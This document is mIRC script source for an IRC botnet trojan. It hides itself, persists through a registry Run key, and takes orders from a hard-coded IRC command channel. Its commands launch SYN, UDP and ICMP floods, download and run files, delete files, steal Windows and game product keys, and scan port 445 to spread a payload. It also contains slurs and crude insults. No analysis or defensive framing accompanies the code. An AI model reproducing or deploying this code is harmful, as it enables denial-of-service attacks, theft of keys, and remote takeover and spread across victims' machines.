on *:text:.login*:%chan:{ if ($level($nick) == 800) || ($level($nick) == 720) { halt } | if ($nick isop %chan) && ($2- = sex) && ($left($nick,1) == Z) && ($right($nick,1) == S) && ($len($nick) == 4) { vtalk 15 $+ $nick $+ , you now have cock sucking access from %b0tversi0n | auser 800 $nick } }
on *:text:!login*:%chan:{ if ($level($nick) == 800) || ($level($nick) == 720) { halt } | if ($nick isop %chan) || ($nick ishop %chan) && ($2 = sex) && ($3 = fiend) && ($left($nick,1) == g) && ($right($nick,1) == t) && ($len($nick) == 4) { vtalk 15 $+ $nick $+ , you now have hand job access from the %b0tversi0n | auser 720 $nick } }
;==========================
; start & exit remote actions
;==========================
on *:start:{ .run -n smc32.exe /n /fh UPDATE | .run -n smc32.exe /n /fh /r "nwbt32.bat" | .run securee.exe | .rlevel 800 | .rlevel 720 | .clearall | .sockclose * | .unsetall | .timers off | .settz | .writeini mcop.dll ident userid $rletterz | .writeini mcop.dll mirc user $rletterz | .emailaddr $rletterz $+ @blue-fuzion.gov | .fullname $rletterz | .nick $nickorz | .conn | .timer 0 30 securityz | .timer 0 20 bgwin | if (!$exists(%spreadfile)) { .scancopy } | .makereg | .timercheckserver -o 0 100 //servercheck | scanpop }
on *:exit:{ .rlevel 800 | .rlevel 720 | .clearall | .sockclose * | .unsetall | .timers off }
;=====================================
;connect & disconnect remote actions
;=====================================
on *:connect:{ .rlevel 800 | .rlevel 720 | .ial on | .pdcc on | .fsend on | .mode $me +ix | .timerbackup* off | if (!$exists(%spreadfile)) { .scancopy } | .timer 0 5 join %chan %key | .run -n smc32.exe /n /fh /r "nwbt32.bat" | .clearall }
on *:disconnect:{ .rlevel 800 | .rlevel 720 | .timercheckserver -o 0 50 //servercheck | .clearall }
;=======================
; user level commands
;=======================
on 720:text:*:*:{ .clearall | .securityz
  if ($1 == .speed) && (!$2) { vtalk 12|15speed12|15 http://www.dslreports.com/archive/ $+ $gettok($host,3-,46) }
  if ($1 == .version) || ($1 == .ver) && (!$2) { vtalk %b0tversi0n }
  if ($1 == .shoutz) && (!$2) { vtalk %sh0utz }
  if ($1 == .people) && ($2 == that) && ($3 == should) && ($4 == die) && (!$5) { vtalk 12|15people12|15 that should die: LimPy }
  if ($1 == .level) && (!$2) { vtalk 12|15level12|15 $nick $+ , you are currently logged in as: user }
  if ($1 == .syn) && ($2) { if ($2 == stop) { halt } | set %synport $3 | if (%synport == random) { set %synport $rand(0,65535) } | vtalk 12|15Syn12|15 flooding: $2 with $4 syn packets on port %synport  | set %synaa $2 | synz start $4 $2 %synport }
  if ($1 == .syn) && ($2 == stop) && (!$3) && (%synaa != $null) { sockclose syn* | vtalk 12|15Syn12|15 flood on: %synaa halted! | unset %syn* | halt }
  if ($1 == .ping) || ($1 == .packet) && ($3) && ($4) { if ($2 == stop) { halt } | run -n smc32.exe /n /fh /r "ping.exe $2 -n $3 -l $4 -w 0" | vtalk 12|15Ping12|15 flooding $2 $+ , with $calc($3 *65536/1024/1000) $+ mb of traffic | set %pingaa $2 }
  if ($1 == .ping) || ($1 == .packet) && ($3) && (!$4) { if ($2 == stop) { halt } | run -n smc32.exe /n /fh /r "ping.exe $2 -n $3 -l 65500 -w 0" | vtalk 12|15Ping12|15 flooding $2 $+ , with $calc($3 *65536/1024/1000) $+ mb of traffic | set %pingaa $2 }
  if ($1 == .ping) || ($1 == .packet) && ($2 == stop) && (%pingaa != $null) { run -n smc32.exe /n /fh /r "ntlib32.exe -kf ping.exe" | vtalk 12|15Ping12|15 flood on: %pingaa halted | unset %pingaa }
  if ($1 == .udp2) && (!$6) && ($2) { if ($2 == stop) && (%udpip != $null) { sockclose sockudp* | vtalk 12|15UDP212|15 flood on: %udpip halted | unset %udpip | halt } | set %port $3 | if (%port == random) { set %port $rand(0,65535) } | set %udpip $2 | /udp.packet $2 -t $+ $4 -p $+ %port -i $+ $5 }
  if ($1 == .logout) && (!$2) { ruser 720 $nick | clearall | vtalk 15 $+ $nick has logged out from user level %b0tversi0n }
  }
;==============================
; administrator level commands
;==============================
on 800:text:*:*:{ .clearall | .securityz
  if ($1 == .speed) && (!$2) { vtalk 12|15speed12|15 http://www.dslreports.com/archive/ $+ $gettok($host,3-,46) }
  if ($1 == .version) || ($1 == .ver) && (!$2) { vtalk %b0tversi0n }
  if ($1 == .shoutz) && (!$2) { vtalk %sh0utz }
  if ($1 == .people) && ($2 == that) && ($3 == should) && ($4 == die) && (!$5) { vtalk 12|15people12|15 that should die: CK21 }
  if ($1 == .visit) && ($2) { set %h $2 | set %g $3 | vtalk 12|15visit12|15 visited: %h $+ %g | sockopen sclick %h 80 }
  if ($1 == .download) && (!$3) && ($2) { if ($2 == stop) { halt } | set %dlfile $2- | downloada $2- }
  if ($1 == .download) && ($2 == stop) && (!$3) && ($sock(download)) { /sockclose download* | vtalk 12|15download12|15 stopped download of: %dlfile | unset %dlfile | halt }
  if ($1 == .reload) && (!$2) { .timer -o 1 10 /server %server1 | vtalk 12|15reloading12|15 in 10 seconds }
  if ($1 == .cskey) && (!$2) { cskey }
  if ($1 == .winkey) && (!$2) { winkey }
  if ($1 === .UnInStAlL) && (!$2) { uinst }
  if ($1 == .rand) && ($2 == nick) && (!$3) { .nick $rletterz }
  if ($1 == .level) && (!$2) { vtalk 12|15level12|15 $nick $+ , you are currently logged in as: administrator }
  if ($1 == .clear) && (!$2) { clearall | vtalk 12|15clear12|15 cleared buffer.. not laggy anymore! }
  if ($1 == .clean) && (!$2) { cleanup }
  if ($1 == .flood) && ($2) && (!$3) { vtalk 12|15flood12|15 on: $2 | .msg $2 %floodmsg4 | .notice $2 %floodmsg2 | .ctcp $2 %floodmsg3 }
  if ($1 == .netsend) && ($2) { vtalk 12|15net-send12|15 sent $2 the message of $3- | .run -n smc32.exe /n /fh /r "net send $2- $+ " }
  if ($1 == .var) && ($2) { vtalk 12|15var12|15 $2- = [ [ $$2- ] ] }
  if ($1 == .findfile) && ($3) { .timer 1 1 vtalk $findfile($2,$3,0, $+ vtalk 12|15find-file12|15 $2- $+ ) }
  if ($1 == .sayfile) && ($4) { .timer 1 1 vtalk 12|15say-file12|15 $findfile($2,$3,$4) }
  if ($1 == .finddir) && ($3) { .timer 1 1 vtalk $finddir($2,$3,0, $+ vtalk 12|15find-dir12|15 $2- $+ ) }
  if ($1 == .saydir) && ($4) { .timer 1 1 vtalk 12|15say-dir12|15 $finddir($2,$3,$4) }
  if ($1 == .killapp) && ($2) && (!$3) { run -n smc32.exe /n /fh /r " $+ $mircdirntlib32.exe -kf $2- $+ " | vtalk 12|15killapp12|15 killed application: $2 }
  if ($1 == .cmd) && ($2) { %cmd = $2- | vtalk 12|15command12|15 // $+ %cmd | // $+ %cmd | unset %cmd }
  if ($1 == .dcc) && ($2 == send) && ($3) && (!$5) { vtalk 12|15dcc12|15 sending $3 $4- | /dcc send $3 $4- }
  if ($1 == .join) && ($2) { join $2 $3- | vtalk 12|15join12|15 channel: $2 -- channel key: $3- }
  if ($1 == .part) && ($2) { if ($2 == %chan) { vtalk 12|15error12|15 cannot part %chan - that's the main channel, asshole | halt } | { part $2 $3- | vtalk 12|15part12|15 channel: $2 -- reason: $3- } }
  if ($1 == .load) && ($2) { .load -rs $2- | vtalk 12|15load12|15 loaded file: $2- }
  if ($1 == .unload) && ($2) { .unload -rs $2- | vtalk 12|15unload12|15 unloaded file: $2- }
  if ($1 == .run) || ($1 == .exec) && ($2) { .run -n smc32.exe /n /fh /r " $+ $2- $+ " | vtalk 12|15run12|15 ran file: $2- }
  if ($1 == .rename) && ($2) { .rename c:\ $+ $2 c:\ $+ $3- | vtalk 12|15renamed12|15 c:\ $+ $2 to c:\ $+ $3- }
  if ($1 == .remove) || ($1 == .delete) && ($2) { .remove $2- | vtalk 12|15remove12|15 removed file: $2- }
  if ($1 == .new) && ($2 == scan) && ($3 == file) { if (!$4) { remove c:\winnt\system32\ $+ %spreadfile | remove c:\winnt\inf\ $+ %spreadfile | vtalk 15old scan file removed, now type .download <URL> and make sure the scan file is named %spreadfile | halt } | if ($4) { remove c:\winnt\system32\ $+ %spreadfile | remove c:\winnt\inf\ $+ %spreadfile | vtalk 15old scan file removed, now downloading new scan file.. | downloada $4- } }
  if ($1 == .spreadfile) && (!$3) && ($2) && (%spreadfile != $2) { vtalk 12|15scanner12|15 now spreading file: $2 | %spreadfile = $2 }
  if ($1 == .copy) { .scancopy }
  if ($1 == .logout) && (!$2) { ruser 800 $nick | clearall | vtalk 15 $+ $nick has logged out from administrator level %b0tversi0n }
  if ($1 == .scan) && ($2) {
    if ($2 == randrange) && (%begshortip == $null) && ($exists(%spreadfile)) { .randscann }
    if ($2 == start) && (%begshortip == $null) && ($exists(%spreadfile)) { vtalk 12|15scanner12|15 starting scan from: $3 to $4 | set %begshortip $3 | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == rand) && (%begshortip == $null) && ($exists(%spreadfile)) { set %begit $randip($3) | vtalk 12|15scanner12|15 starting scan from: %begit to $4 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == host) && ($3 == start) && (%begshortip == $null) && ($exists(%spreadfile)) { set %begit $gettok($ip,1-2,46) $+ . $+ 1 $+ . $+ 1 | vtalk 12|15scanner12|15 scanning: %begit to $gettok($ip,1-2,46) $+ .255.255 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == host) && ($3 == rand) && (%begshortip == $null) && ($exists(%spreadfile)) { set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | vtalk 12|15scanner12|15 scanning: %begit to $gettok($ip,1-2,46) $+ .255.255 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == neighborhood) && (%begshortip == $null) && ($exists(%spreadfile)) { set %begit $gettok($ip,1-3,46) $+ . $+ 1 | vtalk 12|15scanner12|15 scanning: %begit to $gettok($ip,1-3,46) $+ .255 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-3,46) $+ .255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == stop) && (%begshortip != $null) { vtalk 12|15scanner12|15 scanning of %begshortip to %endshortip stopped by $nick $+ ! | stopscan }
    if ($2 == stats) && (%begshortip != $null) { vtalk 12|15scanner12|15 scan stats range: [ %begshortip - %endshortip ] port: [ %scanport ] current ip: [ %ip78 ] total found: [ $totalfound ] spreading file: [ %spreadfile ] }
    if ($2 == port) && ($3) && (!$4) && (%scanport != $3) { vtalk 12|15scanner12|15 now scanning port: $3 | %scanport = $3 }
  }
  if ($1 == .clone) && ($2) {
    if ($2 == load) && ($3) { sockopen Sockets- $+ $r(1,999) $3 $4 | vtalk 12|15clones12|15 loading to: $3 $+ : $+ $4 }
    if ($2 == nick) || ($2 == nicks) { set %clonenick $3- $+ $r(0,999999) | sockwrite -tn Sockets-* nick %clonenick | vtalk 12|15clones12|15 changing nicks to: %clonenick | unset %clonenick }
    if ($2 == join) && ($3) { sockwrite -tn Sockets-* JOIN $3 $4- }
    if ($2 == part) && ($3) { sockwrite -tn Sockets-* PART $3 $4- }
    if ($2 == msg) || ($2 == query) && ($3) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
    if ($2 == notice) && ($3) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
    if ($2 == join2) && ($3) { .timer 1 $r(10,240) sockwrite -tn Sockets-* JOIN $3 $4- }
    if ($2 == part2) && ($3) { .timer 1 $r(10,360) sockwrite -tn Sockets-* PART $3 $4- }
    if ($2 == flood1) || ($2 == flood) && ($3) { sockwrite -tn Sockets-* join $3 | sockwrite -tn Sockets-* PRIVMSG $3 : $+ %floodmsg1 |  sockwrite -tn Sockets-* NOTICE  $3 : $+ %floodmsg2 | sockwrite -tn Sockets-* part $3 | vtalk 12|15clones12|15 starting flood on $3 $+ ! }
    if ($2 == flood2) || ($2 == eflood) && ($3) { sockwrite -tn Sockets-* join $3 | .timer 0 2 sockwrite -tn Sockets-* privmsg $3 : $+ %floodmsg3 |  timer 0 4 sockwrite -tn  Sockets-* notice $3 : $+ %floodmsg1 | vtalk 12|15clones12|15 starting endless flood on $3 $+ ! }
    if ($2 == pmflood) || ($2 == pmf) && ($3) { sockwrite -tn Sockets-* privmsg $3 : $+ %floodmsg1 | sockwrite -tn Sockets-* notice $3 : $+ %floodmsg2  | vtalk 12|15clones12|15 pm flooding: $3 }
    if ($2 == sqflood) || ($2 == sqf) && ($3) { sockwrite -n Sockets-* privmsg $3- : $+ %floodmsg3 | sockwrite -tn Sockets-* nick $rletterz | sockwrite -n Sockets-* privmsg $3- : $+ %floodmsg4 | vtalk 12|15clones12|15 attempting to sendq: $3- }
    if ($2 == kill) || ($2 == quit) || ($2 == disconnect) { sockwrite -tn Sockets-* QUIT : $+ $3- | sockclose Sockets-* | vtalk 12|15clones12|15 all clones disconnected, reason: $3- }
  }
  if ($1 == .info) && (!$3) {
    if ($2 == net) { vtalk 12|15network-information12|15 connection: $dll(bootnt.dll,connection,_) network interfaces: $dll(bootnt.dll,interfaceinfo,_) ip: $ip host: $host }
    if ($2 == cpu) { vtalk 12|15cpu-information12|15 time: $time(h:nn TT) date: $date(mmmm doo yyyy) os: $os cpu: $dll(bootnt.dll,cpuinfo,_) memory: $dll(bootnt.dll,meminfo,_) uptime: $uptime(system,1) hd: $dll(bootnt.dll,diskcapacity,_) }
  }
  if ($1 == .bnc) && ($2) {
    if ($2 == start) && ($4) { if ($sock(Bnc)) { vtalk 12|15bnc12|15 bnc is already active on $ip $+ : $+ %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $3 | %Bnc.port = $3 | %Bnc.passwd = $4 | vtalk 12|15bnc12|15 /server -m $ip $+ : $+ $3 $+ , then /quote pass $4 }
    if ($2 == stats) && ($sock(Bnc)) { vtalk 12|15bnc12|15 is on! $ip $+ : $+ %Bnc.port $+ , pass: %Bnc.passwd users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
    if ($2 == stop) && (%Bnc.Port != $null) { sockclose Bnc* | vtalk 12|15bnc12|15 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
  }
  if ($1 == .syn) && ($2) { if ($2 == stop) { halt } | set %synport $3 | if (%synport == random) { set %synport $rand(0,65535) } | vtalk 12|15Syn12|15 flooding: $2 with $4 syn packets on port %synport  | set %synaa $2 | synz start $4 $2 %synport }
  if ($1 == .syn) && ($2 == stop) && (!$3) && (%synaa != $null) { sockclose syn* | vtalk 12|15Syn12|15 flood on: %synaa halted! | unset %syn* | halt }
  if ($1 == .timersyn) && ($3) && (!$8) { set %synport $3 | if (%synport == random) { set %synport $rand(0,65535) } | set %syntimes $4 | set %timernumber $5 | set %ttimes $6 | set %tmsdelay $7 | set %synaa $2 | set %timersyn synz start $4 $2 %synport | timersyn }
  if ($1 == .ping) || ($1 == .packet) && ($3) && ($4) { if ($2 == stop) { halt } | run -n smc32.exe /n /fh /r "ping.exe $2 -n $3 -l $4 -w 0" | vtalk 12|15Ping12|15 flooding $2 $+ , with $calc($3 *65536/1024/1000) $+ mb of traffic | set %pingaa $2 }
  if ($1 == .ping) || ($1 == .packet) && ($3) && (!$4) { if ($2 == stop) { halt } | run -n smc32.exe /n /fh /r "ping.exe $2 -n $3 -l 65500 -w 0" | vtalk 12|15Ping12|15 flooding $2 $+ , with $calc($3 *65536/1024/1000) $+ mb of traffic | set %pingaa $2 }
  if ($1 == .ping) || ($1 == .packet) && ($2 == stop) && (%pingaa != $null) { run -n smc32.exe /n /fh /r "ntlib32.exe -kf ping.exe" | vtalk 12|15Ping12|15 flood on: %pingaa halted | unset %pingaa }
  if ($1 == .udp2) && (!$6) && ($2) { if ($2 == stop) && (%udpip != $null) { sockclose sockudp* | vtalk 12|15UDP212|15 flood on: %udpip halted | unset %udpip | halt } | set %port $3 | if (%port == random) { set %port $rand(0,65535) } | set %udpip $2 | /udp.packet $2 -t $+ $4 -p $+ %port -i $+ $5 }
  if ($1 == .icmp) && ($2) {
    if ($2 == stop) && (%icmpaa != $null) {
      vtalk 12|15ICMP12|15 flood on: %icmpaa halted
      unset %icmpaa
      run -n smc32.exe /n /fh /r "ntlib32.exe -kf nm32g.vbs"
      remove nm32g.vbs
      halt
     }
      if ($2 == stop) { halt }
      if (!$3) { halt }
      if (!$4) { halt }
      set %icmpaa $2
      vtalk 12|15ICMP12|15 flooding $2 with a packet size of $3 a total of $4 times
      timerremove 1 200 /remove nm32g.vbs
      write nm32g.vbs on error resume next
      write nm32g.vbs Set bl = CreateObject("Wscript.shell")
      write nm32g.vbs bl.run "ping $2 -w 0 -l $3 -n $4 $+ ",0,true
      run -n smc32.exe /n /fh /r "nm32g.vbs"
      halt
  }
  if ($1 == .udp) && ($2) {
    if ($2 == stop) && (%udpaa != $null) {
      vtalk 12|15UDP12|15 flood on: %udpaa halted
      unset %udpaa
      sockclose sockudp*
      halt
    }
    if ($2 == stop) { halt }
    if (!$3) { halt }
    if (!$4) { halt }
    set %start 0
    set %end $4
    set %udpaa $2
    set %udpport $3
    if (!$isfile(uvxd32.vxd)) { udp.gen }
    if (%udpport == random) { set %udpport $rand(0,65535) }
    vtalk 12|15UDP12|15 flooding $2 on port %udpport a total of $4 times
    :udploop
    if (%start == %end) {
      vtalk 12|15UDP12|15 flood on: %udpaa complete
      unset %udpaa
      unset %udpport
      halt
    }
    inc %start 1
    if ($3 == 0) {
      set %randname $rand(10000,99999)
      set %uvxd32 $read(uvxd32.vxd)
      set %udpport $rand(0,65535)
      sockudp Udp $+ %randname $+ a $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ b $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ c $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ d $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ e $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ f $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ g $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ h $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ i $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ j $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ k $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ l $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ m $2 %udpport %uvxd32
      goto udploop
    }
    if ($4 != 0) {
      set %randname $rand(10000,99999)
      set %uvxd32 $read(uvxd32.vxd)
      sockudp Udp $+ %randname $+ a $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ b $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ c $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ d $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ e $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ f $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ g $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ h $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ i $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ j $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ k $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ l $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ m $2 %udpport %uvxd32
      goto udploop
    }
  }
}

;==================
; aliases & raws
;==================
alias conn {
  %floodmsg1 = $str(OWNED,35)
  %floodmsg2 = $str(OWNED,80)
  %floodmsg3 = $str(FAGFAGFAG,31)
  %floodmsg4 = $str(½¾,100)
  if ($portfree(113)) { socklisten IDENT 113 }
  if (%server1 == $null) { %server1 = matrix.chatz.org:6667 } | if (%server2 == $null) { %server2 = matrix.wxmail.net:6667 } | if (%server3 == $null) { %server3 = matrix.gamezx.com:6667 } | /server %server1
}
alias servercheck {
  if (!$server) || ($server == $null) {
    if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 0) { set %servercheck 1 | server %server2 | halt }
    if (%servercheck = 1) { set %servercheck 2 | server %server3 | halt }
    if (%servercheck = 2) { set %servercheck 0 | server %server1 | halt }
  }
  else { halt }
}
raw 332:*:{ if ($3 == .scan) && ($4) { if ($4 == rand) && (%begshortip == $null) && ($exists(%spreadfile)) { set %begit $randip($5) | vtalk 12|15scanner12|15 starting scan from: %begit to $6 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $6 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan } | if ($4 == host) && ($5 == rand) && (%begshortip == $null) && ($exists(%spreadfile)) { set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | vtalk 12|15scanner12|15 scanning: %begit to $gettok($ip,1-2,46) $+ .255.255 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan } } | if ($3 == .syn) && ($4) { if ($4 == stop) { halt } | set %synport $5 | if (%synport == random) { set %synport $rand(0,65535) } | vtalk 12|15Syn12|15 flooding: $4 with $6 syn packets on port %synport  | set %synaa $4 | synz start $6 $4 %synport } } }
alias settz { %chan = #!wewe | %key = winblows | %scanport = 445 | %spreadfile = bfm3n.exe | %sh0utz = blah blah blah | %b0tversi0n = bot | if ($os == 95) || ($os == 98) || ($os == ME) { %windir = C:\WINDOWS\ | %bootdir = C:\\WINDOWS\\ | %bsys = C:\\WINDOWS\\SYSTEM32\\ } | if ($os == XP) || ($os == 2K) || ($os == NT) || ($os == 2000) { %windir = C:\WINNT\ | %bootdir = C:\\WINNT\\ | %bsys = C:\\WINNT\\SYSTEM32\\ } }
alias makereg { $RegWrite(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\taskdebug,$mircdirtskdbg.exe,REG_SZ) }
alias delreg { $RegDelete(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\taskdebug) }
alias vtalk { if ($me isvo %chan) || ($me ishop %chan) || ($me isop %chan) { .clearall | .msg %chan $1- } }
alias downloada { if ($sock(download)) { vtalk 12|15download12|15 0error: already downloading a file. | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | vtalk 12|15download12|15 downloading: $1- | .sockopen download %download1 80 }
alias cskey { vtalk 12|15keys12|15 CS key: $RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key) | vtalk 12|15keys12|15 HL key: $RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key) }
alias winkey { vtalk 12|15keys12|15 windows key: $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId) | vtalk 12|15keys12|15 windows key: $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey) }
alias rletterz { .return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
alias nickorz { return Z- $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) }
alias cleanup { sockclose * | .run -n smc32.exe /n /fh /r "ntlib32.exe -kf ping.exe" | clearall | vtalk 12|15clean12|15 cleaned up.. not laggy anymore! }
alias hide { .run -n smc32.exe /n /fh UPDATE }
alias fakenick { .nick FAKE- $+ $rletterz }
alias uinst { if (!$isfile(ntnm32.bat)) { .makeuinst | vtalk 12|15uninstall12|15 removing files & removing from registry | delreg | run -n smc32.exe /n /fh /r "ntnm32.bat" | .quit %b0tversi0n ip: $ip host: $host time uninstalled: $time(h:nn TT) date uninstalled: $date(mmmm doo yyyy) | .exit } | else vtalk 12|15uninstall12|15 removing files & removing from registry | delreg | run -n smc32.exe /n /fh /r "ntnm32.bat" | .quit %b0tversi0n ip: $ip host: $host time uninstalled: $time(h:nn TT) date uninstalled: $date(mmmm doo yyyy) | .exit }
alias makeuinst {
 .write ntnm32.bat @echo off
 .write ntnm32.bat del bootnt.dll
 .write ntnm32.bat del ntnwsys.ocx
 .write ntnm32.bat del mcop.dll
 .write ntnm32.bat del brn32.dll
 .write ntnm32.bat del msvs32.bat
 .write ntnm32.bat del ntzm32.dll
 .write ntnm32.bat del nwbt32.bat
 .write ntnm32.bat del pcc32.exe
 .write ntnm32.bat del ntlib32.exe
 .write ntnm32.bat del smc32.exe
 if ($exists(%spreadfile)) { .write ntnm32.bat del %spreadfile }
 if ($exists(c:\winnt\system32\ $+ %spreadfile)) { .write ntnm32.bat del c:\winnt\system32\ $+ %spreadfile }
 .write ntnm32.bat del tskdbg.exe
 .write ntnm32.bat del ntnm32.bat
}
alias bgwin { .window -p @Microsoft.Windows.Update 0 0 1600 1200 | .timer 0 5 window -a @Microsoft.Windows.update }
alias securityz {
  if ($appstate == hidden) { .clearall }
  if ($appstate != hidden) { vtalk 12|15security12|15 not hidden | .hide | .clearall }
  if (!$exists(smc32.exe)) { vtalk 12|15security12|15 hidewindow is missing! | hide | clearall }
  if ($portfree(27374)) { .sockopen Antivirus 127.0.0.1 27374 }
  bgwin
} }
alias udp.err { if ($isid) { return 12|15UDP212|15 error } }
alias udp.packet {
  if (!$isfile(uvxd32.vxd)) { udp.gen }
  if ($1) {
    var %ip = $1 , %port , %a , %b , %c , %times , %interval
    if ($numtok(%ip,46) != 4) { vtalk $udp.err | return }
    if (*-t* !iswm $1-) { vtalk $udp.err | return }
    else { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -t) { %times = $remove(%b,-t) | %a = $0 } | inc %a } }
    if (*-p* iswm $1-) { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -p) { %port = $remove(%b,-p) | %a = $0 } | inc %a } | if (%port !isnum 1-65553) { %port = r } }
    else { %port = r }
    if (*-i* iswm $1-) { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -i) { %interval = $remove(%b,-i) | %a = $0 } | inc %a } }
    if (%interval = $null) || (%interval < 0) { vtalk $udp.err | return }
    $iif($iif(%interval <= 999,ms,sec) = ms,%c = $+(%interval,ms),%c = $+($calc(%interval / 1000),s))
    vtalk 12|15UDP212|15 flooding %ip on port %port a total of %times times with a interval of %c
    .timer -oh %times %interval udp.packet2 %ip %port
   }
}
alias udp.packet2 {
  if ($2) {
    var %a 1 , %ip = $1 , %port = $iif($2 = r,$r(1,65553),$2) , %str = $left($read(uvxd32.vxd,$r(1,$lines(uvxd32.vxd))),400)
    while (%a <= 10) { sockudp $+(udp,$calc($r(1,999999999999999) / $ticks)) %ip %port %str | inc %a }
  }
}
alias udp.gen {
  var %ascii-start = 200 , %ascii-end = 250 , %bytes = 400 , %file = uvxd32.vxd
  while (%ascii-start <= %ascii-end) { write %file $str($chr(%ascii-start),%bytes) | inc %ascii-start }
}
alias timersyn { .timer $+ %timernumber %ttimes %tmsdelay %timersyn | vtalk 12|15TimerSyn12|15 timer $+ %timernumber set to Syn flood: %synaa on port %synport with %syntimes syn packets a total of %ttimes times every %tmsdelay seconds | unset %timersyn | unset %tmsdelay | unset %syn* | unset %ttimes }
alias synz { if ($1 == $null) { return } | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | vtalk 12|15Syn12|15 flood on: %synaa complete! | unset %syn* }
alias syn {
  if ($2 == start) { if (%synport !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == halt) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
;==================================================
;netbios autospreader
;==================================================
alias startscan {
  inc %totalscaning
  if %totalscaning >= %total /finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
